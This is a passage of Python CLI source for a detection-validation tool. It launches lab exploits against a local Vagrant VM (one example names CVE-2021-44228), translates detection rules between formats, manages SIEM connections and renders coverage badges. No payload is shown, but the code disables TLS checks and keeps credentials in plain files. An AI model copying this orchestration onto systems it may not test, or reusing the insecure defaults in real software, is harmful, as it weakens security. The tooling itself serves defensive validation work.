        capture_output=True, text=True, cwd=str(VAGRANT_DIR),
    )
    if "state,running" not in (r.stdout + r.stderr):
        console.print("  VM not running — starting it (this may take a few minutes)…")
        _run(["vagrant", "up"], cwd=VAGRANT_DIR)
    else:
        console.print("  [green]✓[/] VM already running")

    # ── 3: Confirm vulnerable-service port ───────────────────────────────────
    console.print("\n[bold cyan]▶ Step 3/6  Vulnerable service port[/]")
    vuln_port = "9088"
    if _port_open(9088):
        console.print("  [green]✓[/] Vulnerable service reachable on 9088")
    else:
        console.print("  [dim]Port 9088 not yet open — will retry at attack time[/]")

    # ── 4: Canary + auto-repair ───────────────────────────────────────────────
    console.print("\n[bold cyan]▶ Step 4/6  Canary check[/]")
    canary_r = subprocess.run(
        [_sys.argv[0], "doctor", "--canary"],
        capture_output=True, text=True,
    )
    output_text = canary_r.stdout + canary_r.stderr
    if canary_r.returncode != 0 or "FAIL" in output_text:
        console.print("  [yellow]Canary failed — attempting auto-repair…[/]")
        _run([_sys.argv[0], "repair"])
        _run([_sys.argv[0], "doctor", "--canary"])
    else:
        console.print(canary_r.stdout.strip())

    # ── 5: Attack ─────────────────────────────────────────────────────────────
    console.print(f"\n[bold cyan]▶ Step 5/6  Attack  {cve}[/]")
    _run([
        _sys.argv[0], "attack",
        "--cve", cve.upper(),
        "--target", "vagrant",
        "--agent-port", "9098",
        "--mode", "exploit",
        "--vuln-port", vuln_port,
    ])

    # ── 6: Wait + validate ────────────────────────────────────────────────────
    console.print("\n[bold cyan]▶ Step 6/6  Waiting 5s for Vector to flush…[/]")
    _time.sleep(5)
    console.print(f"[bold cyan]            Validating  {rules}[/]")
    _run([_sys.argv[0], "validate", rules, "--since", "0.1"])

    console.print(
        "\n[bold green]✓ Demo complete.[/]  "
        "View events at [cyan]http://localhost:5601[/]"
    )


@main.command()
@click.argument("source_fmt")
@click.argument("target_fmt")
@click.option("--rules", default=".", show_default=True,
              help="Path to rules file or directory.")
@click.option("--output", "-o", default="-",
              help="Output file path (- for stdout).")
def migrate(source_fmt: str, target_fmt: str, rules: str, output: str) -> None:
    """Translate detection rules between formats.

    Reads rules in SOURCE_FMT, converts each to a CanonicalDetection, then
    serializes them to TARGET_FMT.

    \b
    Supported formats: sigma, splunk, kql
    Examples:
      dv migrate sigma splunk --rules detections/ -o splunk_searches.conf
      dv migrate sigma kql --rules rule.yml
    """
    from detection_validator.parsers.registry import ParserRegistry
    from detection_validator.parsers.base import ParseError
    from pathlib import Path as _Path

    _SUPPORTED = {"sigma", "splunk", "kql"}
    for fmt_name, fmt_val in [("SOURCE_FMT", source_fmt), ("TARGET_FMT", target_fmt)]:
        if fmt_val.lower() not in _SUPPORTED:
            err_console.print(f"[red]{fmt_name} '{fmt_val}' not supported.[/]  Choose from: {', '.join(sorted(_SUPPORTED))}")
            raise SystemExit(1)

    registry = ParserRegistry()
    root = _Path(rules)
    files = [root] if root.is_file() else sorted(f for f in root.rglob("*") if f.is_file())

    detections = []
    for fp in files:
        try:
            parser = registry.find_parser(fp)
            if parser is None:
                continue
            detections.append(parser.parse_file(fp))
        except (ParseError, Exception) as exc:
            err_console.print(f"[yellow]⚠[/] {fp.name}: {exc}")

    if not detections:
        err_console.print(f"[red]No parseable rules found in:[/] {rules}")
        raise SystemExit(1)

    target = target_fmt.lower()
    out_fh = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout
    total = 0
    try:
        for det in detections:
            techs = [t.full_id for t in det.mitre_techniques]
            tactics = list(dict.fromkeys(
                t.tactic for t in det.mitre_techniques if t.tactic and t.tactic != "unknown"
            ))
            sev_map = {"info": "informational", "low": "low", "med": "medium",
                       "high": "high", "critical": "critical"}
            sev = sev_map.get(det.severity.value, "medium")
            cve_refs = [r.cve_id for r in det.cve_references]

            if target == "sigma":
                import yaml as _yaml
                tags = [f"attack.{t.lower()}" for t in tactics]
                tags += [f"attack.{t.lower()}" for t in techs]
                tags += [f"cve.{c.split('-')[1]}.{c.split('-')[2]}" for c in cve_refs]
                logic = det.detection_logic
                detection_section = {}
                if logic and logic.raw and logic.language == "sigma":
                    try:
                        parsed = _yaml.safe_load(logic.raw)
                        detection_section = parsed.get("detection", {}) if parsed else {}
                    except Exception:
                        pass
                if not detection_section:
                    if techs:
                        detection_section = {
                            "selection": {"technique|contains": techs},
                            "condition": "selection",
                        }
                    else:
                        detection_section = {"keywords": [det.name], "condition": "keywords"}
                rule = {
                    "title": det.name,
                    "id": str(det.id),
                    "status": "test",
                    "description": det.description or det.name,
                    "tags": tags,
                    "logsource": {"product": "linux", "service": "auditd"},
                    "detection": detection_section,
                    "falsepositives": det.false_positive_notes or ["Unknown"],
                    "level": sev,
                }
                print(_yaml.dump(rule, allow_unicode=True, sort_keys=False).rstrip(), file=out_fh)
                print("---", file=out_fh)

            elif target == "splunk":
                tech_filter = " OR ".join(f'technique="{t}"' for t in techs) if techs else "index=dv-telemetry"
                sev_num = {"critical": "1", "high": "2", "medium": "3", "low": "4"}.get(sev, "3")
                spl = (
                    f"[{det.name}]\n"
                    f"search = index=dv-telemetry ({tech_filter})"
                    f' | eval detection="{det.name}"'
                    f" | table _time, technique, key, exe, uid, cmd_output\n"
                    f"alert.severity = {sev_num}\n"
                    f"description = {det.description or det.name}\n"
                )
                print(spl, file=out_fh)

            elif target == "kql":
                if techs:
                    tech_filter = " or ".join(f'technique: "{t}"' for t in techs)
                    kql = f"// {det.name}\n{tech_filter}\n"
                else:
                    kql = f"// {det.name}\n* | where isnotempty(technique)\n"
                print(kql, file=out_fh)

            total += 1
            err_console.print(f"[green]✓[/] {det.name}")

    finally:
        if output != "-":
            out_fh.close()

    err_console.print(f"\n[bold]Migrated:[/] {total} rule(s)  {source_fmt} → {target_fmt}")


@main.group()
def siem() -> None:
    """Manage and query SIEM backend connections."""


@siem.command("status")
@click.option("--type", "siem_type", default="opensearch", show_default=True,
              type=click.Choice(["opensearch", "splunk"]))
def siem_status(siem_type: str) -> None:
    """Check local container state and SIEM HTTP connectivity.

    Shows docker-compose container status for the local stack (if Docker is
    available), then confirms OpenSearch/Splunk is accepting connections.

    \b
    Examples:
      dv siem status
      dv siem status --type splunk
    """
    import base64 as _b64
    import json as _json
    import os as _os
    import ssl
    import urllib.error
    import urllib.request

    # ── Local docker container state (informational, never fatal) ─────────────
    if siem_type == "opensearch" and _docker_check() is None and _local_compose_file().exists():
        rc, out = _docker_compose_run(["ps", "--format", "table"])
        if rc == 0 and out.strip():
            console.print("[bold]Local containers:[/]")
            for line in out.splitlines():
                console.print(f"  {line}")
            console.print()

    if siem_type == "opensearch":
        # Try local no-auth stack first (dv siem up), then fall back to auth'd stack
        _local_ok = False
        try:
            with urllib.request.urlopen("http://localhost:9200", timeout=3) as resp:
                info = _json.loads(resp.read())
            version = info.get("version", {}).get("number", "?")
            console.print(f"[green]✓[/] OpenSearch [bold]{version}[/]  at http://localhost:9200 [dim](local, no-auth)[/]")
            _local_ok = True
        except Exception:
            pass

        if not _local_ok:
            os_pass = _os.environ.get("OPENSEARCH_INITIAL_ADMIN_PASSWORD", "")
            if not os_pass:
                err_console.print("[yellow]⚠ OPENSEARCH_INITIAL_ADMIN_PASSWORD not set — auth may fail[/]")
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            creds = _b64.b64encode(f"admin:{os_pass}".encode()).decode()
            headers = {"Authorization": f"Basic {creds}"}
            base = "https://localhost:9200"
            try:
                req = urllib.request.Request(base, headers=headers)
                with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
                    info = _json.loads(resp.read())
                version = info.get("version", {}).get("number", "?")
                console.print(f"[green]✓[/] OpenSearch [bold]{version}[/]  at {base}")
            except urllib.error.HTTPError as exc:
                if exc.code in (401, 403):
                    err_console.print(f"[yellow]⚠[/] OpenSearch reachable but auth failed (HTTP {exc.code}) — check OPENSEARCH_INITIAL_ADMIN_PASSWORD")
                else:
                    err_console.print(f"[red]✗[/] OpenSearch HTTP {exc.code}")
                return
            except Exception as exc:
                err_console.print(f"[red]✗[/] OpenSearch not reachable: {exc}")
                err_console.print(
                    "  Start the local stack: [cyan]dv siem up[/]\n"
                    "  Or start the full lab: [cyan]./dv up lab --siem opensearch[/]"
                )
                return

        # Index counts — works for both local (no-auth HTTP) and lab (auth HTTPS)
        _idx_base = "http://localhost:9200" if _local_ok else base
        _idx_hdrs: dict = {} if _local_ok else headers
        _idx_ctx = None if _local_ok else ctx
        for index in ("dv-telemetry-*", ".opendistro-alerting-alert*"):
            try:
                req2 = urllib.request.Request(f"{_idx_base}/{index}/_count", headers=_idx_hdrs)
                with urllib.request.urlopen(req2, context=_idx_ctx, timeout=5) as resp2:
                    n = _json.loads(resp2.read()).get("count", 0)
                console.print(f"  [cyan]{index}[/]: {n:,} documents")
            except Exception:
                console.print(f"  [dim]{index}: (unavailable)[/]")

    elif siem_type == "splunk":
        try:
            req = urllib.request.Request("http://localhost:8000")
            with urllib.request.urlopen(req, timeout=4) as resp:
                console.print(f"[green]✓[/] Splunk mock UI reachable (HTTP {resp.status}) at http://localhost:8000")
        except Exception as exc:
            err_console.print(f"[red]✗[/] Splunk not reachable: {exc}")
            return
        console.print(f"  HEC endpoint: http://localhost:8088/services/collector")


@siem.command("test")
@click.argument("name", required=False, default=None, metavar="[NAME]")
@click.option("--type", "siem_type", default="opensearch", show_default=True,
              type=click.Choice(["opensearch", "splunk"]),
              help="Local SIEM type (used when NAME is not given).")
@click.option("--index", default="dv-telemetry-*", show_default=True)
@click.option("--size", default=3, show_default=True, help="Number of sample events to show.")
def siem_test(name: str | None, siem_type: str, index: str, size: int) -> None:
    """Run a test query and show sample events from the SIEM.

    Pass NAME to test a SIEM registered via 'dv siem add'.
    Omit NAME to test the local opensearch/splunk service.

    \b
    Examples:
      dv siem test                     # local OpenSearch
      dv siem test prod                # registry entry named 'prod'
      dv siem test --type splunk       # local Splunk mock
    """
    import base64 as _b64
    import json as _json
    import os as _os
    import ssl
    import urllib.request
    import urllib.error

    # ── Registry-based test ───────────────────────────────────────────────────
    if name is not None:
        cfg = _find_siem(name)
        if cfg is None:
            err_console.print(
                f"[red]No SIEM named '{name}' in registry.[/]  "
                f"Run: [cyan]dv siem add {name} --type ...[/]"
            )
            raise SystemExit(1)

        url = cfg.get("url", "https://localhost:9200").rstrip("/")
        siem_cfg_type = cfg.get("type", "opensearch")
        idx = cfg.get("index", index)
        verify = cfg.get("verify_tls", True)

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        if not verify:
            ctx.verify_mode = ssl.CERT_NONE

        headers: dict = {"Content-Type": "application/json"}
        if cfg.get("api_key"):
            headers["Authorization"] = f"ApiKey {cfg['api_key']}"
        elif cfg.get("username"):
            creds = _b64.b64encode(
                f"{cfg['username']}:{cfg.get('password','')}".encode()
            ).decode()
            headers["Authorization"] = f"Basic {creds}"
        elif cfg.get("token"):
            headers["Authorization"] = f"Splunk {cfg['token']}"

        if siem_cfg_type in ("opensearch", "elasticsearch"):
            # 1. Cluster health
            try:
                req = urllib.request.Request(f"{url}/_cluster/health", headers=headers)
                with urllib.request.urlopen(req, context=ctx, timeout=8) as resp:
                    health = _json.loads(resp.read())
                status = health.get("status", "?")
                nodes = health.get("number_of_nodes", "?")
                style = {"green": "green", "yellow": "yellow", "red": "red"}.get(status, "white")
                console.print(
                    f"[green]✓[/] [{style}]{name}[/]  cluster_status={status}  nodes={nodes}  url={url}"
                )
            except urllib.error.HTTPError as exc:
                err_console.print(f"[red]✗[/] {name}: HTTP {exc.code} — check URL/credentials")
                raise SystemExit(1)
            except Exception as exc:
                err_console.print(f"[red]✗[/] {name}: {exc}")
                raise SystemExit(1)

            # 2. Event count in configured index
            count_query = _json.dumps({"query": {"match_all": {}}}).encode()
            try:
                req2 = urllib.request.Request(
                    f"{url}/{idx}/_count", data=count_query, headers=headers
                )
                with urllib.request.urlopen(req2, context=ctx, timeout=8) as resp2:
                    n = _json.loads(resp2.read()).get("count", 0)
                console.print(f"  [cyan]{idx}[/]: {n:,} documents")
            except Exception:
                console.print(f"  [dim]{idx}: (count unavailable)[/]")

            # 3. Sample events
            sample_q = _json.dumps({
                "size": size,
                "sort": [{"timestamp": {"order": "desc"}}],
                "query": {"match_all": {}},
                "_source": ["timestamp", "technique", "key", "exe", "uid", "cmd_output"],
            }).encode()
            try:
                req3 = urllib.request.Request(
                    f"{url}/{idx}/_search", data=sample_q, headers=headers
                )
                with urllib.request.urlopen(req3, context=ctx, timeout=8) as resp3:
                    hits = _json.loads(resp3.read()).get("hits", {}).get("hits", [])
                if hits:
                    console.print()
                    for h in hits:
                        s = h["_source"]
                        out = str(s.get("cmd_output", ""))[:80].replace("\n", " ")
                        console.print(
                            f"  [green]{s.get('technique','?'):12s}[/]  "
                            f"[cyan]{s.get('key','?'):20s}[/]  "
                            f"exe={s.get('exe','?')}"
                        )
                        if out:
                            console.print(f"    [dim]{out}[/]")
            except Exception:
                pass
        elif siem_cfg_type == "splunk":
            try:
                req = urllib.request.Request(
                    f"{url}/services/server/info?output_mode=json", headers=headers
                )
                with urllib.request.urlopen(req, context=ctx, timeout=8) as resp:
                    info = _json.loads(resp.read())
                build = info.get("entry", [{}])[0].get("content", {}).get("build", "?")
                console.print(f"[green]✓[/] {name}  Splunk build={build}  url={url}")
            except Exception as exc:
                err_console.print(f"[red]✗[/] {name}: {exc}")
                raise SystemExit(1)
        return

    # ── Local type-based test (original behavior) ─────────────────────────────
    if siem_type == "opensearch":
        os_pass = _os.environ.get("OPENSEARCH_INITIAL_ADMIN_PASSWORD", "")
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        creds = _b64.b64encode(f"admin:{os_pass}".encode()).decode()
        query = _json.dumps({
            "size": size,
            "sort": [{"timestamp": {"order": "desc"}}],
            "query": {"match_all": {}},
            "_source": ["timestamp", "technique", "key", "exe", "uid", "cmd_output"],
        }).encode()
        req = urllib.request.Request(
            f"https://localhost:9200/{index}/_search",
            data=query,
            headers={"Content-Type": "application/json",
                     "Authorization": f"Basic {creds}"},
        )
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=8) as resp:
                data = _json.loads(resp.read())
        except Exception as exc:
            err_console.print(f"[red]✗[/] Query failed: {exc}")
            return
        hits = data.get("hits", {}).get("hits", [])
        total = data.get("hits", {}).get("total", {}).get("value", 0)
        console.print(f"[green]✓[/] {total:,} documents in [cyan]{index}[/]  (showing {len(hits)})\n")
        for h in hits:
            s = h["_source"]
            out = str(s.get("cmd_output", ""))[:80].replace("\n", " ")
            console.print(
                f"  [green]{s.get('technique','?'):12s}[/]  "
                f"[cyan]{s.get('key','?'):20s}[/]  "
                f"exe={s.get('exe','?'):30s}  uid={s.get('uid','?')}"
            )
            if out:
                console.print(f"    [dim]{out}[/]")
    else:
        err_console.print(f"[yellow]Test query not implemented for {siem_type}[/]")


@siem.command("add")
@click.argument("name")
@click.option("--type", "siem_type", required=True,
              type=click.Choice(["opensearch", "elasticsearch", "splunk"]),
              help="SIEM backend type.")
@click.option("--url", required=True,
              help="Base URL, e.g. https://opensearch.example.com:9200")
@click.option("--username", default=None, help="Basic-auth username.")
@click.option("--password", default=None, help="Basic-auth password.")
@click.option("--api-key", default=None, help="API key (Elasticsearch cloud).")
@click.option("--token", default=None, help="HEC token (Splunk).")
@click.option("--index", default="dv-telemetry-*", show_default=True,
              help="Index pattern to query.")
@click.option("--verify-tls/--no-verify-tls", default=True, show_default=True,
              help="Verify TLS certificate.")
def siem_add(
    name: str, siem_type: str, url: str,
    username: str | None, password: str | None,
    api_key: str | None, token: str | None,
    index: str, verify_tls: bool,
) -> None:
    """Register an external SIEM connection.

    Stores credentials in ~/.detectionvalidator/siems.yaml.
    Re-running with the same NAME replaces the existing entry.

    \b
    Examples:
      dv siem add prod --type opensearch \\
          --url https://opensearch.example.com:9200 \\
          --username admin --password secret --no-verify-tls
      dv siem add cloud --type elasticsearch \\
          --url https://my.cloud.elastic.co:9243 --api-key abc123
      dv siem add splunk-prod --type splunk \\
          --url https://splunk.example.com:8088 --token my-hec-token
    """
    entries = [e for e in _load_registry() if e.get("name") != name]
    entry: dict = {
        "name": name, "type": siem_type,
        "url": url.rstrip("/"), "verify_tls": verify_tls, "index": index,
    }
    if username:
        entry["username"] = username
    if password:
        entry["password"] = password
    if api_key:
        entry["api_key"] = api_key
    if token:
        entry["token"] = token
    entries.append(entry)
    _save_registry(entries)
    console.print(f"[green]✓[/] SIEM [bold]{name}[/] registered ({siem_type}  {url})")
    console.print(f"  Verify: [cyan]dv siem test {name}[/]")


@siem.command("list")
def siem_list() -> None:
    """List all registered SIEM connections."""
    entries = _load_registry()
    if not entries:
        console.print("[dim]No SIEMs registered.[/]  Add one with: [cyan]dv siem add NAME --type ...[/]")
        return
    tbl = Table(show_header=True, header_style="bold", box=None, padding=(0, 1))
    tbl.add_column("Name", style="bold")
    tbl.add_column("Type", style="cyan")
    tbl.add_column("URL")
    tbl.add_column("Auth", style="dim")
    tbl.add_column("Index", style="dim")
    for e in entries:
        auth = "apikey" if e.get("api_key") else ("token" if e.get("token") else "basic")
        tbl.add_row(
            e.get("name", "?"), e.get("type", "?"), e.get("url", "?"),
            auth, e.get("index", "dv-telemetry-*"),
        )
    console.print(tbl)


@siem.command("up")
@click.option("--wait/--no-wait", default=True, show_default=True,
              help="Poll until OpenSearch is healthy before returning (up to 90s).")
def siem_up(wait: bool) -> None:
    """Start the local single-node OpenSearch + Dashboards stack.

    Uses docker/opensearch/docker-compose.yml.  Security and TLS are disabled
    — for local development only.  Requires Docker Desktop with ~2 GB RAM.

    \b
    Once running:
      OpenSearch API   http://localhost:9200
      Dashboards UI    http://localhost:5601

    \b
    Examples:
      dv siem up
      dv siem up --no-wait   # return immediately without polling
    """
    import time as _time
    import urllib.request as _req

    docker_err = _docker_check()
    if docker_err:
        err_console.print(f"[red]✗[/] {docker_err}")
        raise SystemExit(1)

    compose = _local_compose_file()
    if not compose.exists():
        err_console.print(f"[red]✗[/] Compose file not found: {compose}")
        raise SystemExit(1)

    console.print("[cyan]Starting local OpenSearch stack…[/]  (this may take 30–60 s on first run)")
    rc, out = _docker_compose_run(["up", "-d", "--remove-orphans"])
    if rc != 0:
        err_console.print(f"[red]✗[/] docker compose up failed:\n{out}")
        raise SystemExit(1)

    console.print("[green]✓[/] Containers started")

    if wait:
        console.print("  Waiting for OpenSearch to be healthy…", end="", flush=True)
        deadline = _time.time() + 90
        ready = False
        while _time.time() < deadline:
            try:
                with _req.urlopen("http://localhost:9200/_cluster/health", timeout=2) as resp:
                    import json as _j
                    h = _j.loads(resp.read())
                    if h.get("status") in ("green", "yellow"):
                        ready = True
                        break
            except Exception:
                pass
            _time.sleep(3)
            console.print(".", end="", flush=True)
        console.print()
        if not ready:
            err_console.print(
                "[yellow]⚠ OpenSearch did not become healthy within 90 s.[/]\n"
                "  Check logs: [cyan]docker compose -f docker/opensearch/docker-compose.yml logs[/]"
            )
            return

    console.print(
        "\n[bold green]✓ Local OpenSearch is up.[/]\n"
        "  OpenSearch API   [cyan]http://localhost:9200[/]\n"
        "  Dashboards UI    [cyan]http://localhost:5601[/]\n\n"
        "  [dim]dv siem status[/]   — confirm connectivity and index counts\n"
        "  [dim]dv siem down[/]     — stop the stack (data volume preserved)\n"
        "  [dim]dv validate ...[/]  — run detection analysis against live OpenSearch"
    )


@siem.command("down")
@click.option("--volumes", is_flag=True, default=False,
              help="Also remove the named data volume (destroys all indexed data).")
def siem_down(volumes: bool) -> None:
    """Stop the local OpenSearch + Dashboards stack.

    Data is preserved in the named Docker volume unless --volumes is passed.

    \b
    Examples:
      dv siem down              # stop, keep data
      dv siem down --volumes    # stop + delete all indexed data
    """
    docker_err = _docker_check()
    if docker_err:
        err_console.print(f"[red]✗[/] {docker_err}")
        raise SystemExit(1)

    args = ["down"]
    if volumes:
        args.append("--volumes")
        console.print("[yellow]⚠ --volumes: all indexed data will be deleted.[/]")

    console.print("[cyan]Stopping local OpenSearch stack…[/]")
    rc, out = _docker_compose_run(args)
    if rc != 0:
        err_console.print(f"[red]✗[/] docker compose down failed:\n{out}")
        raise SystemExit(1)

    vol_note = " (data volume removed)" if volumes else " (data volume preserved)"
    console.print(f"[green]✓[/] Stack stopped{vol_note}")


@siem.command("attach")
@click.argument("name")
def siem_attach(name: str) -> None:
    """Configure Vector on the Vagrant VM to also ship events to a registered SIEM.

    Appends a new sink to /etc/vector/vector.toml, validates the config,
    and restarts Vector.  Every sink gets buffer.when_full=drop_newest to
    prevent a slow external SIEM from deadlocking the local pipeline.

    \b
    Example:
      dv siem add prod --type opensearch --url https://os.example.com:9200 \\
          --username admin --password secret
      dv siem attach prod
    """
    import base64 as _b64
    import subprocess
    from pathlib import Path as _Path

    cfg = _find_siem(name)
    if cfg is None:
        err_console.print(
            f"[red]No SIEM named '{name}' in registry.[/]  "
            f"Run: [cyan]dv siem add {name} --type ...[/]"
        )
        raise SystemExit(1)

    siem_type = cfg.get("type", "opensearch")
    sink_name = re.sub(r"[^a-z0-9_]", "_", name.lower())

    if siem_type in ("opensearch", "elasticsearch"):
        url = cfg.get("url", "https://localhost:9200")
        user = cfg.get("username", "admin")
        pw = cfg.get("password", "")
        idx = cfg.get("index", "dv-telemetry-%Y.%m.%d")
        verify = str(cfg.get("verify_tls", True)).lower()
        toml_block = (
            f"\n[sinks.{sink_name}_out]\n"
            f'type = "elasticsearch"\n'
            f'inputs = ["parse_events"]\n'
            f'endpoints = ["{url}"]\n'
            f'api_version = "v8"\n'
            f'suppress_type_name = true\n'
            f'mode = "bulk"\n\n'
            f"  [sinks.{sink_name}_out.auth]\n"
            f'  strategy = "basic"\n'
            f'  user = "{user}"\n'
            f'  password = "{pw}"\n\n'
            f"  [sinks.{sink_name}_out.bulk]\n"
            f'  index = "{idx}"\n\n'
            f"  [sinks.{sink_name}_out.tls]\n"
            f"  verify_certificate = {verify}\n"
            f"  verify_hostname = false\n\n"
            f"  [sinks.{sink_name}_out.buffer]\n"
            f'  type = "memory"\n'
            f"  max_events = 1000\n"
            f'  when_full = "drop_newest"\n'
        )
    elif siem_type == "splunk":
        endpoint = cfg.get("url", "http://localhost:8088")
        token = cfg.get("token", "")
        toml_block = (
            f"\n[sinks.{sink_name}_out]\n"
            f'type = "splunk_hec_logs"\n'
            f'inputs = ["parse_events"]\n'
            f'endpoint = "{endpoint}"\n'
            f'token = "{token}"\n\n'
            f"  [sinks.{sink_name}_out.buffer]\n"
            f'  type = "memory"\n'
            f"  max_events = 1000\n"
            f'  when_full = "drop_newest"\n'
        )
    else:
        err_console.print(f"[red]Unsupported SIEM type: {siem_type}[/]")
        raise SystemExit(1)

    vagrant_dir = _Path(__file__).parents[2] / "vagrant"
    if not vagrant_dir.exists():
        err_console.print(f"[red]vagrant/ directory not found: {vagrant_dir}[/]")
        raise SystemExit(1)

    # Base64-encode the block to avoid shell quoting issues over SSH
    block_b64 = _b64.b64encode(toml_block.encode()).decode()
    steps = [
        ("Append sink to /etc/vector/vector.toml",
         f"echo '{block_b64}' | base64 -d | sudo tee -a /etc/vector/vector.toml > /dev/null"),
        ("Validate Vector config",
         "sudo vector validate /etc/vector/vector.toml"),
        ("Restart Vector",
         "sudo systemctl restart vector"),
    ]

    failed = 0
    for label, cmd in steps:
        console.print(f"  ▶  {label}…", end="")
        try:
            r = subprocess.run(
                ["vagrant", "ssh", "-c", cmd],
                capture_output=True, text=True, timeout=30,
                cwd=str(vagrant_dir),
            )
            if r.returncode == 0:
                console.print(" [green]✓[/]")
            else:
                failed += 1
                err_text = (r.stderr or r.stdout).strip().splitlines()
                console.print(f" [red]✗[/]  {err_text[-1] if err_text else '?'}")
        except subprocess.TimeoutExpired:
            failed += 1
            console.print(" [red]✗[/]  timeout")
        except Exception as exc:
            failed += 1
            console.print(f" [red]✗[/]  {exc}")

    console.print()
    if failed == 0:
        console.print(f"[green]✓[/] Vector now shipping events to [bold]{name}[/] ({siem_type})")
        console.print(
            f"  Verify: [cyan]dv attack --cve CVE-2021-44228 --target vagrant ...[/]\n"
            f"          [cyan]dv validate examples/detections/sigma/ --siem {name} --since 1[/]"
        )
    else:
        console.print(f"[red]{failed} step(s) failed.[/]")
        raise SystemExit(1)


@main.group()
def agent() -> None:
    """Manage and inspect remote telemetry agents."""


@agent.command("status")
@click.option("--port", default="9098", show_default=True,
              help="Victim agent HTTP port.")
def agent_status(port: str) -> None:
    """Check victim agent health and report capabilities.

    \b
    Examples:
      dv agent status
      dv agent status --port 9099
    """
    import json as _json
    import urllib.request

    for p in ([port] if port else ["9098", "9099"]):
        url = f"http://localhost:{p}/health"
        try:
            with urllib.request.urlopen(url, timeout=4) as resp:
                body = _json.loads(resp.read()) if resp.status == 200 else {}
            console.print(f"[green]✓[/] Victim agent reachable at http://localhost:{p}/health")
            if body:
                for k, v in body.items():
                    console.print(f"  [cyan]{k}[/]: {v}")
            return
        except Exception:
            continue
    err_console.print(f"[red]✗[/] Victim agent not reachable on port {port}")
    err_console.print("  Start the Vagrant VM:  [cyan]cd vagrant && vagrant up[/]")


@agent.command("logs")
@click.option("--port", default="9098", show_default=True)
@click.option("--since", default=1.0, show_default=True,
              help="Show events from the last N hours.")
@click.option("--limit", default=20, show_default=True)
def agent_logs(port: str, since: float, limit: int) -> None:
    """Fetch recent audit events from the victim agent.

    \b
    Examples:
      dv agent logs
      dv agent logs --since 0.5 --limit 50
    """
    import json as _json
    import urllib.request
    import urllib.error
    import urllib.parse

    params = urllib.parse.urlencode({"since": since, "limit": limit})
    url = f"http://localhost:{port}/events?{params}"
    try:
        with urllib.request.urlopen(url, timeout=8) as resp:
            events = _json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        if exc.code == 404:
            err_console.print(f"[yellow]⚠[/] Agent at port {port} does not expose /events — try querying OpenSearch directly")
        else:
            err_console.print(f"[red]✗[/] Agent HTTP {exc.code}: {exc}")
        return
    except Exception as exc:
        err_console.print(f"[red]✗[/] Could not reach agent on port {port}: {exc}")
        err_console.print("  Tip: export events via:  [cyan]vagrant ssh -c 'sudo tail -n 100 /var/log/audit/audit-events.jsonl'[/]")
        return

    if not events:
        console.print("[dim]No events in the requested window.[/]")
        return

    console.print(f"[green]{len(events)} event(s)[/] from last {since}h\n")
    for ev in events[-limit:]:
        ts = str(ev.get("timestamp", "?"))[:19]
        tech = ev.get("technique", "?")
        key = ev.get("key", "?")
        out = str(ev.get("cmd_output", ev.get("proctitle", "")))[:70].replace("\n", " ")
        console.print(f"  [dim]{ts}[/]  [green]{tech:12s}[/]  [cyan]{key}[/]")
        if out:
            console.print(f"    [dim]{out}[/]")


@main.command()
@click.option("--detections", "-d", required=True, type=click.Path(exists=True),
              help="JSONL file of CanonicalDetection objects (from dv enrich/map).")
@click.option("--format", "fmt", default="svg", show_default=True,
              type=click.Choice(["svg", "json"]))
@click.option("--output", "-o", default="coverage-badge.svg", show_default=True,
              help="Output file path (- for stdout).")
@click.option("--label", default="ATT&CK coverage", show_default=True,
              help="Left-side label text on the SVG badge.")
def badge(detections: str, fmt: str, output: str, label: str) -> None:
    """Generate an ATT&CK coverage badge from a detection corpus.

    Reads a CanonicalDetection JSONL file, counts unique techniques across
    rules whose validation_status is PASSED, and renders the ratio as an
    SVG badge (shields.io flat style) or a JSON metrics object.

    \b
    Examples:
      dv badge -d enriched.jsonl
      dv badge -d enriched.jsonl --format json -o badge.json
      dv badge -d enriched.jsonl -o coverage.svg --label "Detection coverage"
    """
    import json as _json
    from detection_validator.normalizer.schema import CanonicalDetection, ValidationStatus

    corpus: list[CanonicalDetection] = []
    with open(detections, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                corpus.append(CanonicalDetection.model_validate_json(line))
            except Exception:
                continue

    all_techniques: set[str] = set()
    covered: set[str] = set()
    for det in corpus:
        for t in det.mitre_techniques:
            all_techniques.add(t.full_id)
            if det.validation_status == ValidationStatus.PASSED:
                covered.add(t.full_id)

    total = len(all_techniques)
    n_covered = len(covered)
    pct = (n_covered / total * 100) if total > 0 else 0.0
    color_name = "brightgreen" if pct >= 70 else ("yellow" if pct >= 40 else "red")
    color_hex = {"brightgreen": "#4c1", "yellow": "#dfb317", "red": "#e05d44"}[color_name]

    if fmt == "json":
        payload = {
            "label": label,
            "total_techniques": total,
            "covered_techniques": n_covered,
            "coverage_pct": round(pct, 1),
            "color": color_name,
            "rules_total": len(corpus),
            "rules_passed": sum(1 for d in corpus if d.validation_status == ValidationStatus.PASSED),
        }
        text = _json.dumps(payload, indent=2)
        if output in ("-", "coverage-badge.svg"):
            console.print(text)
        else:
            Path(output).write_text(text, encoding="utf-8")
            err_console.print(f"[green]✓[/] Badge JSON written to [bold]{output}[/]")
        return

    value = f"{n_covered}/{total} ({pct:.0f}%)"
    lw = max(len(label) * 6 + 10, 60)
    vw = max(len(value) * 6 + 10, 60)
    tw = lw + vw

    svg = (
        f'<svg xmlns="http://www.w3.org/2000/svg" width="{tw}" height="20">\n'
        f'  <linearGradient id="s" x2="0" y2="100%">'
        f'<stop offset="0" stop-color="#bbb" stop-opacity=".1"/>'
        f'<stop offset="1" stop-opacity=".1"/></linearGradient>\n'
        f'  <clipPath id="r"><rect width="{tw}" height="20" rx="3" fill="#fff"/></clipPath>\n'
        f'  <g clip-path="url(#r)">\n'
        f'    <rect width="{lw}" height="20" fill="#555"/>\n'
        f'    <rect x="{lw}" width="{vw}" height="20" fill="{color_hex}"/>\n'
        f'    <rect width="{tw}" height="20" fill="url(#s)"/>\n'
        f'  </g>\n'
        f'  <g fill="#fff" text-anchor="middle"'
        f' font-family="DejaVu Sans,Verdana,Geneva,sans-serif" font-size="11">\n'
